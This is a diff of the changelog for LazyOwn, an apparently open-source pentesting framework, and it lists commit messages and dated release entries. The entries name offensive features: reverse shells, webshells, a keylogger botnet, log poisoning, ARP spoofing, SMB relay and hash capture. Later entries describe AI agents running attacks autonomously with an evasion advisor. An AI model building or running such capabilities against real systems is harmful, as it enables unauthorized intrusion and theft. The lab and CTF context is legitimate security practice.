-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new aliases :D
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new command clock to see the time of the eternal now :) now in white xD
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new command clock to see the time of the eternal now :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 newhashcat
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new comands conptyshell better command nc noew with tty treatment createhash better now with recognice automate download_resource
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new commands ignorearp ignoreicmp acknowledgearp acknowledgeicmp ports cports
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 wfuzz command now search subdomains with wfuzz sub domain.htb new commands nc, vpn, rev, banner :D
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 New Colors :D
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 adding run script to run lazyown with virtual env activated to avoid errors
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 adding alias to exit as q :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 adding alias to commands its una shulada
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new command py3ttyup to upgrade to tty your rev shell :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new commands ip www to show ips and start webserver at sessions directory where lazyown dump scripts like revertshells, webshells, etc
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 solarlab pwned :D new machine MagicGardens
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine solarlab :D
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new revshell.c and machine powned xD axlle hard
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new commands createrevshell y createwinrevshell
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Freelancer Pwned :P new new new FormulaX :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Freelancer :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Skyfall Linux insane machine, Blazorized was powned :D
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Blazorized.htb
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Greenhorn.htb pwned
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Greenhorn.htb
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new tool in external :) https://github.com/BloodHoundAD/SharpHound.git :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new MAchine Blazorized.htb :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new MAchine :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 New command to copy the exploits from exploitdb use cp relative/path/show/in/searchexploit when you use the flag -x :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 New command dsnmap :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 New machine Runner.htb
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 New command :) new resources in sessions, new module lazypsexec bruteforce :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 New command :) samrdump
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 news script bruteforce on modules :) :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 new command dnsenum :)
-- join to our team https://app.hackthebox.com/teams/overview/6429 new command dig
-- join to our team https://app.hackthebox.com/teams/overview/6429 new commands :)
-- join to our team https://app.hackthebox.com/teams/overview/6429 new commands :) to se use tab tab or ?
-- join to our team https://app.hackthebox.com/teams/overview/6429 and new payloads in sessions directory :) :) :)
-- join to our team https://app.hackthebox.com/teams/overview/6429 and new exploits :)
-- news exploits
-- new hashcat :D
-- new command dirsearch :D
-- new proxy better :D
-- new commands createhash, createwebshell, sqlmap, proxy, john2hash
-- 1 new exploit
-- 2 new exploit external :D working like a charm
-- new command: exploits externals :D
-- new command: smbmap whattomap ex: smbmap tmp :D
-- go buster new parameter url to use url from payload not rhost
-- parameter added to gospider url to use var url in payload not rhost and add the command addhost host.ext to add the domain with rhost parameter to /etc/hosts not now to windows sistems sorry
-- path hijacking add line to temp bash script
-- new command: gospider :D
-- new command: gobuster :D
-- new command: wfuzz :D and you can add example a hide line option like # wfuzz --hl=9 to hide responses with long line to 9
-- new command: run lazyssh77enum to enum using a wordlist and exploit foound searchsploit as openssh 7.7
-- new command: whatweb :D
-- new command: psexec :D
-- new command getseclist :D
-- new commit to check if alsr is activated in the kernel
-- new comand arpscan
-- new path to diccionary to run by default in parrot
-- new gitignore
-- add #!/usr/bin/env python3 #_*_ coding: utf8 _*_
-- new tags
-- Create lazyclonewars.sh
-- new honeypot
-- New BotNet with Keylogger
-- new netbios atack mode
-- new comand payload :)
-- Add files via upload
+### Nuevas características
 
-### Changed
+### Otros
 
-- 
-- 
-- extract state.py and models.py from lazyc2.py
-- 
-- auto-generate 10 CommandSet files from lazyown.py via migration script
-- bump certifi from 2026.4.22 to 2026.6.17
-- bump triton from 3.6.0 to 3.7.1
-- bump python-engineio from 4.13.2 to 4.13.3
-- bump cuda-bindings from 13.2.0 to 13.3.1
-- bump nvidia-nvtx from 13.0.85 to 13.3.29
-- shadow a beacon over dns :D
-- Merge pull request #182 from grisuno/dependabot/pip/yagmail-0.16.0
-- Merge pull request #183 from grisuno/dependabot/pip/coverage-7.15.2
-- Merge pull request #184 from grisuno/dependabot/pip/typing-extensions-4.16.0
-- Merge pull request #185 from grisuno/dependabot/pip/parso-0.8.7
-- Merge pull request #186 from grisuno/dependabot/pip/lxml-6.1.1
-- bump lxml from 6.1.0 to 6.1.1
-- bump parso from 0.8.6 to 0.8.7
-- bump typing-extensions from 4.15.0 to 4.16.0
-- bump coverage from 7.13.5 to 7.15.2
-- bump yagmail from 0.15.293 to 0.16.0
-- payloads refactos
-- more modularization of lazyown.py file
-- more modularization of lazyc2.py file
-- decostruction of the monolitic
-- some improvements in linting
-- We changed graphify for ReadMenator
-- Contrib
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- Merge pull request #177 from grisuno/grisuno-patch-2
-- Update CONTRIBUTING.md
-- test
-- test: test
-- orquestator of playbooks
-- test: test
-- database, module manager, some payload generation, resource scripting, and love
-- 
-- 
-- wire tui_theme command and first-run splash into the shell
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- unify next-best-action recommenders into one engine
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- generate recon plan from trigger catalog after scan
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- Update README.md
-- 
-- wire local-shell xterm to /pty namespace with websocket transport
-- Final submission: Expand LazyOwn capabilities for Cloud/K8s and Multi-Index RAG
-- Expand LazyOwn capabilities with Cloud/K8s support and Multi-Index RAG
-- 
-- SSE daemon transport + reliable restart script
-- detect ABABAB oscillation + rebalance policy transitions
-- ACL errors no longer trigger evasion advisor; stuck-loop blocks by base name
-- stuck-loop recovery covers any repeated command, not just 'list'
-- 
-- self-healing autonomous loop — credential/domain auto-injection, nmap XML parse, stuck-loop recovery
-- 
-- world-class MCP expansion — 92 tools, 26 data sources, zero-gap operator autonomy
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- please subscribe :P
-- 
-- test
-- 
-- 
-- rpcmap_py, serveralive2, john2zip, createusers_and_hashs, pykerbrute, reg_py
-- 
-- test
-- 
-- samdump2
-- 
-- cubespraying & magicrecon
-- 
-- shellcode2sylk
-- 
-- tes
-- 
-- tes
-- 
-- test
-- tes
-- test
-- release: test
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- 
-- prueba de nuevos tipos de commits
-- 
-- 
-- 
-- El cierre de una imagen en la documentación estaba mal :)
-- Nueva descripcion en el readme y probando el CHANGELOG.sh :)
-- ahora el changelog a docs :D en formato html
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 some changes in the web pandoc README.md -f markdown -t html -s -o README.html madremia que comandazo 👽
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 some changes in the web 👽
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 comming soon tryhackme 👽
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽👽
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 3ast3r366 👽
-- Merge pull request #27 from grisuno/clcthulhu-patch-1
-- docs(update readme description): change of the description; Update README.md
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 mejorando la documentaciòn 👽
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 command vpn now handle multiple ovpn files 👽
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 Magicgardens is so insane but pwned :)
-- 👽 some love to readme
-- 👽 some changes in nmap script now discovery have template html too and we have a little index2.html to navigate the reports
-- 👽 some littles changes :)
-- 👽 changing the command in venom :)
-- 👽 holly jissus mist.htb now pwned with my user :P its rally insane amount of work to pwn
-- 👽 holly jissus mist.htb machine cost to me one week and my mental health xD bu it's pwned xD
-- 👽 todo readme
-- Update README.md
-- 👽 update gitignore
-- 👽 command list to update the readme: todo
-- 👽 no more prints ( 👽 we have 13 xD) now we have technologì we have print_msg, print_error & print_warn :) so much pretty
-- Update README.md
-- 👽 better prints 👽
-- 👽 conptyshell better 👽
-- some roder to prints, not finished yet but the storm its cut the electricity so commit
-- Create sessions.sh
-- some ideas
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 command smbserver now create file.scf to generate a attackto the victim try to charge an iccon from our smbserver and the hash is ours
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 the target was pwntomated 🍅 alias auto
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 the target was pwntomated 🍅. jejejjejej
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 now with pwntomate to automate with the command pyautomate
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 now command nmap or run lazynmap has a html and xml reports to more pleasssure. xD
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 some format
-- HackTheBox https://app.hackthebox.com/teams/overview/6429
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 now options like --help, -v and --no-banner :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 was banned from htb to spoiler jajjajaj xD
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 msf command
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 scripts to try attac cammeras not work with my cammera yet xD
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 clean command to clean up the mess and pwn the next machine :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 wfuzz commands pwd, sh
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 some love to list command :D
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 some love in form of colored strings :D
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 some love to some prints :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 FormulaX pwned :)
-- HackTheBox https://app.hackthebox.com/teams/overview/6429
-- Update README.md
-- Update lazyproxy.py
-- join to our team https://app.hackthebox.com/teams/overview/6429
-- little discover .sh
-- Create internal_discover.sh
-- Update README.md
-- refactor global var rhost deleted other ones
-- smbclient command and exploit to enum ssh i used in a machine of hackthebox to enum, i upload because i was lazy and dont deleted before xD
-- Merge pull request #22 from grisuno/grisuno-patch-1
-- Update README.md
-- mariadb rce :)
-- payload.json to play on hackthebox :D
-- port a python del exploit archiconocido de meta exploit vsftpd 3.0.3
-- shell payload in python generated by msfvenom automated by lazyown framework ;)
-- deleted shells generated by the script
-- upx to shells generated by msfvenom automated by lazyown framework ;)
-- cambios en el miniburp
-- Update index.html
-- Update install.sh
-- herramienta para ofuscar payloads y es usada en lazylogpoisoner ;) pronto extendida al resto de payloads ;)
-- lazymitmap.py
-- Update lazycurl.sh
-- Update README.md
-- lazycurl.sh
-- Update install.sh
-- Update requirements.txt
-- Merge pull request #21 from grisuno/grisuno-patch-1
-- Update CNAME
-- Update install.sh
-- Create CNAME
-- metatags to seo
-- Lazy ntlmv2 firstaproach using in hashes.txt the ouput smbserver command when the conection is established
-- Lazy .gitignore
-- Lazy get smbserver with impacket :) and then you can sudo impacket-smbserver smbfolder /home/gris/tools/LazyOwn -smb2support with simple smbserver in LazyOwn console
-- LAzy get capabilities :P
-- LazyOwn FTP sniff prety messages :)
-- LazyOwn keygen to generate keys to use in payload.json to cypher the conections
-- LazyOwn smbrelay
-- LazyOwn http sniff :( not working fine yet
-- Update README.md
-- LazyOwn ftp sniff :)
-- LazyOwn README
-- LazyOwn ArpSpoofing README and banner :P [;,;]
-- LazyOwn ArpSpoofing [;,;]
-- Update README.md
-- Lazy path hijacking :)
-- Lazy msfvenom reverse :)
-- Lazy Log more lfi list :)
-- Lazy Log Poisonig more poison bro
-- Lazy Log Poisonig in ssh first aproach
-- Lazy Log Poisonig
-- Delete lazylogpisoning.py
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- Update app.py
-- Lazy Log Poisonig
-- Update lazypwnkit.py
-- Create lazyssh.py
-- #!/usr/bin/env python3 #_*_ coding: utf8 _*_
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- Update README.md
-- Update lazylfi2rce.py
-- dic
-- Update app.py
-- dos2unix
-- Update README.md
-- better implementation
-- tentativas de herramientas nuevas
-- google analytics
-- dos2unix
-- Update index.html
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- Update .gitignore
-- delete python librarys
-- use of python3 env
-- Update index.html
-- Update README.md
-- Update index.html
-- banner
-- nueva shell zsh :)
-- index nuevo
-- Create index.html
-- Update app.py
-- imlementacion de libreria pwn
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- Create lazygalazy.py
-- Update app.py
-- Update README.md
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- Update lazywebshell.sh
-- Update README.md
-- Update app.py
-- Create lazywebshell.sh
-- mejora en la webshell de python
-- webshells
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- comentarios necesarios
-- Update README.md
-- return jsonify({"error": "error"}), 500
-- py2elf experimental
-- nueva interfaz web experimental
-- Update app.py
-- nuevo bot de investigacion
-- remove keys xD
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- Merge pull request #13 from grisuno/grisuno-patch-7
-- Update README.md
-- Create pull_request_template.md
-- Update README.md
-- Create pull_request_template.md
-- device to sniff parametric
-- netbios atack
-- Update lazynetbios.py
-- update req*
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- Update README.md
-- del
-- mejoras en ncurses
-- Update lazysniff.py
-- nuevo modulo de sniffer
-- Update lazyownclient.py
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- Update README.md
-- nuevo modulo de gathering
-- Update search.py
-- nueva estructura de directorios
-- Update app.py
-- Update README.md
-- Update lazyownserver.py
-- Merge pull request #10 from grisuno/grisuno-patch-6
-- Update lazyownclient.py
-- Update README.md
-- Update requirements.txt
-- Update app.py
-- Create lazyownclient.py
-- Create lazyownserver.py
-- Update app.py
-- Update README.md
-- Update app.py
-- Update lazynmap.sh
-- Update requirements.txt
-- Update app.py
-- Merge pull request #8 from grisuno/grisuno-patch-6
-- Update requirements.txt
-- Update README.md
-- Update app.py
-- Create lazyown_metaextract0r.py
-- Update README.md
-- Update lazygptcli.py
-- Update README.md
-- Update lazygptcli.py
-- Update README.md
-- Update app.py
-- Update README.md
-- Create app.py
-- Update README.md
-- Create lazyown_bprfuzzer.py
-- Update lazygptcli.py
-- Merge pull request #6 from grisuno/grisuno-patch-5
-- Update update_db.sh
-- Update requirements.txt
-- Update README.md
-- Update lazygptcli.py
-- Create lazygptcli.py
-- Update README.md
-- Create lazynmap.sh
-- Update lazyreverse_shell.sh
-- Merge pull request #5 from grisuno/grisuno-patch-4
-- Update README.md
-- Create lazyreverse_shell.sh
-- Update README.md
-- Update requirements.txt
-- Update README.md
-- Update LazyOwnExplorer.py
-- Update README.md
-- Create LazyOwnExplorer.py
-- Update README.md
-- Merge pull request #4 from grisuno/grisuno-patch-3
-- Create requirements.txt
-- Create CODE_OF_CONDUCT.md
-- Update issue templates
-- Create CONTRIBUTING.md
-- Merge pull request #3 from grisuno/grisuno-patch-2
-- Create LICENSE
-- Merge pull request #1 from grisuno/grisuno-patch-1
-- Update lazyown.py
-- Update README.md
-- Create lazyatack.sh
-- Update README.md
-- Create lazysearch.py
-- Update README.md
-- Update update_db.sh
-- Update README.md
-- Create update_db.sh
-- Update README.md
-- Create lazyown.py
-- Create bin_data_relevant.csv
-- Create bin_data.csv
-- Create detailed_search.py
-- Create search.py
-- Update README.md
+  *   * feat(reco): unify next-best-action recommenders into one engine
 
-### Security
 
-- Security advisory some prints whit debug data :)
-- Security Advisory from code scan in soupsieve
-- Security Advisory from code scan
-- feat(security,packaging): authorization scope guard + reproducible installs
-- untrack runtime cache knowledge_base_vuln.json
-- add lazyc2 security layer with validators, services, and pytest tests
-- Create SECURITY.md
+### Nuevas características
 
-### Fixed
+### Otros
 
-- some bug fixing :D
-- Update install.sh for package installations and fixes
-- Expand capabilities (Cloud/K8s/RAG) and fix CI
-- Expand LazyOwn capabilities and fix CI
-- some bugs xD
-- fix
-- 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 bug fixing 👽
-- 👽 bug fixing in createhash, new wrappers, chisel command updated now can choice the payload, img2cookie new payloads
-- 👽 bug fixing and replace command nc with pwncatcs more fancy and sharp :)
-- 👽 bug fixing in wfuzz sub command wen you not pass the domain
-- 👽 chisel fix copy to clipboard commad bug
-- feat: Now the GPT Client use Llama 70B and now can hack :) fixing error path from json files :P
-- HackTheBox https://app.hackthebox.com/teams/overview/6429 fix arguments little bug
-- join to our team https://app.hackthebox.com/teams/overview/6429 and new command run lazywerkzeugdebug
-- new exploit werkzeug in debug mode lettle retocated to run in python3 from searchsploit :D
-- fix install
-- Fix code scanning alert - Information exposure through an exception #16
-- Fix code scanning alert - Flask app is run in debug mode #17
-- new command fixperm
+  *   * feat(feat): Stream de razonamiento del daemon \n\n Version: release/0.2.147 \n\n Kill-chain que se llena solo \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mar 02 jun 2026 17:44:35 -04 \n\n Hora: 1780436675
 
-## [0.0.0]
 
-### Changed
+### Correcciones
 
-- test
-- release
-- release(release test): test
-- migration from cmd to cmd2
+### Otros
+
+  *   * fix(fix): ruff fix \n\n Version: release/0.2.146 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mar 02 jun 2026 00:56:15 -04 \n\n Hora: 1780376175
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feature): some love to modularization \n\n Version: release/0.2.145 \n\n esto quizas debo ser un refactor \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: lun 01 jun 2026 19:51:06 -04 \n\n Hora: 1780357866
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): new l00t commands \n\n Version: release/0.2.143 \n\n and some love \n\n Modified file(s):\n- CLAUDE.md - COMMANDS.md - cli/command_chain.py - cli/command_index.json - docs/COMMANDS.html - docs/command_chain.md - lazyown.py - skills/lazyown_mcp.py - tests/test_command_chain.py - tests/test_command_palette.py\nCreated file(s):\n- cli/command_chain.py - docs/command_chain.md - tests/test_command_chain.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mié 27 may 2026 23:50:28 -04 \n\n Hora: 1779940228
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(chain): add prev/next command-chain primitive + CLAUDE.md tech-debt law
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): new docs \n\n Version: release/0.2.141 \n\n with love \n\n Modified file(s):\n- .github/dependabot.yml - .hermes/plans/2026-05-25_lazyown-architecture-improvements.md - AGENTS.md - CLAUDE.md - COMMANDS.md - CONTRIBUTING.md - ESSENTIALS.md - QUICKSTART.md - README.md - SECURITY.md - UTILS.md - docs/COMMANDS.html - docs/UTILS.html - docs/c2.md - docs/cred.md - docs/enum.md - docs/exfil.md - docs/exploit.md - docs/lateral.md - docs/persist.md - docs/postexp.md - docs/privesc.md - docs/recon.md - docs/report.md - lazyc2/security/README.md - lazyown.py - modules/cgi-bin/README.md - modules/modules/README.md - pull_request_template.md - readmeneitor.py - run_telegram_hermes.sh - skills/README.md - skills/hermes-lazyown/README.md - skills/hermes-lazyown/SKILL.md - skills/hermes-lazyown/__init__.py - skills/hermes-lazyown/claudemd_rules.py - skills/hermes-lazyown/config_bridge.py - skills/hermes-lazyown/constants.py - skills/hermes-lazyown/executor.py - skills/hermes-lazyown/hermes_sync.py - skills/hermes-lazyown/mcp_server.py - skills/hermes-lazyown/output_compactor.py - skills/lazyown.md - skills/lazyown/SKILL.md - skills/tests/README.md - telegram_hermes.py - test/README.md - utils.py\nCreated file(s):\n- .github/dependabot.yml - .hermes/plans/2026-05-25_lazyown-architecture-improvements.md - docs/c2.md - docs/cred.md - docs/enum.md - docs/exfil.md - docs/exploit.md - docs/lateral.md - docs/persist.md - docs/postexp.md - docs/privesc.md - docs/recon.md - docs/report.md - lazyc2/security/README.md - modules/cgi-bin/README.md - modules/modules/README.md - run_telegram_hermes.sh - skills/hermes-lazyown/README.md - skills/hermes-lazyown/SKILL.md - skills/hermes-lazyown/__init__.py - skills/hermes-lazyown/claudemd_rules.py - skills/hermes-lazyown/config_bridge.py - skills/hermes-lazyown/constants.py - skills/hermes-lazyown/executor.py - skills/hermes-lazyown/hermes_sync.py - skills/hermes-lazyown/mcp_server.py - skills/hermes-lazyown/output_compactor.py - skills/tests/README.md - telegram_hermes.py - test/README.md\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: lun 25 may 2026 02:27:57 -04 \n\n Hora: 1779690477
+
+
+### Otros
+
+### Otros
+
+  *   * fix: regenerate COMMANDS.md/UTILS.md, fix utils.py banner, translate remaining Spanish comments
+
+
+### Otros
+
+### Otros
+
+  *   * docs: add branching strategy (dev/pp/main) to CLAUDE.md, AGENTS.md, CONTRIBUTING.md, SKILL.md
+
+
+### Otros
+
+### Otros
+
+  *   * docs: translate all Spanish docstrings/UI to English, sync MCP tool count to 131, add phase guides
+
+
+### Otros
+
+### Otros
+
+  *   * feat: add Hermes-native MCP integration layer (hermes-lazyown)
+
+
+### Otros
+
+### Otros
+
+  *   * Create dependabot.yml
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(themes to popups :D): with love \n\n Version: release/0.2.141 \n\n :D \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: dom 24 may 2026 23:45:48 -04 \n\n Hora: 1779680748
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(better contract in payload.json): better wizard --tutorial \n\n Version: release/0.2.139 \n\n  \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: dom 24 may 2026 03:54:59 -04 \n\n Hora: 1779609299
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new graphos \n\n Version: release/0.2.139 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: sáb 23 may 2026 04:26:06 -04 \n\n Hora: 1779524766
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some new feats \n\n Version: release/0.2.138 \n\n with love \n\n Modified file(s):\n- .gitignore - AGENTS.md - CHEATSHEET.md - ESSENTIALS.md - PLAN_WORLDCLASS.md - QUICKSTART.md - cli/commands/__init__.py - cli/commands/enum.py - cli/commands/recon.py - cli/lazynmap_post.py - cli/recon_plan.py - knowledge_base_vuln.json - lazyown.py - modules/knowledge_base_vuln.json - scripts/setup_hermes_mcp.sh - skills/README.md - skills/lazyown/README.md - skills/lazyown/SKILL.md - soul.md - tests/test_lazynmap_post.py - tests/test_recon_plan.py\nDeleted file(s):\n- knowledge_base_vuln.json - modules/knowledge_base_vuln.json\nCreated file(s):\n- AGENTS.md - CHEATSHEET.md - ESSENTIALS.md - PLAN_WORLDCLASS.md - cli/commands/enum.py - cli/commands/recon.py - cli/lazynmap_post.py - cli/recon_plan.py - scripts/setup_hermes_mcp.sh - skills/lazyown/README.md - skills/lazyown/SKILL.md - soul.md - tests/test_lazynmap_post.py - tests/test_recon_plan.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: vie 22 may 2026 21:52:50 -04 \n\n Hora: 1779501170
+
+
+### Otros
+
+### Otros
+
+  *   * Batch A: migrate 22 do_* methods to phase-scoped CommandSets + Hermes-friendly docs
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(lazynmap): generate recon plan from trigger catalog after scan
+
+
+### Otros
+
+### Otros
+
+  *   * chore(dedup): untrack runtime cache knowledge_base_vuln.json
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor in tools): all green now \n\n Version: release/0.2.135 \n\n :D \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: jue 21 may 2026 17:16:43 -04 \n\n Hora: 1779398203
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(some refactors in wizards): with love \n\n Version: release/0.2.134 \n\n :D \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: jue 21 may 2026 04:22:24 -04 \n\n Hora: 1779351744
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): binding ips \n\n Version: release/0.2.134 \n\n security issue \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: jue 21 may 2026 00:25:14 -04 \n\n Hora: 1779337514
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): and security issues \n\n Version: release/0.2.132 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mié 20 may 2026 23:06:59 -04 \n\n Hora: 1779332819
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): surface \n\n Version: release/0.2.132 \n\n new command to explore the surface of operation \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mié 20 may 2026 13:12:50 -04 \n\n Hora: 1779297170
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): suggested commands \n\n Version: release/0.2.131 \n\n  \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mar 19 may 2026 23:05:50 -04 \n\n Hora: 1779246350
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): lazyaddons \n\n Version: release/0.2.130 \n\n mroe granularity to lazyaddosns and triggers ? comming soon \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mar 19 may 2026 00:55:27 -04 \n\n Hora: 1779166527
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new exploit \n\n Version: release/0.2.129 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: dom 17 may 2026 23:59:39 -04 \n\n Hora: 1779076779
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new orquestator \n\n Version: release/0.2.128 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: dom 17 may 2026 00:56:05 -04 \n\n Hora: 1778993765
+
+
+### Nuevas características
+
+### Otros
+
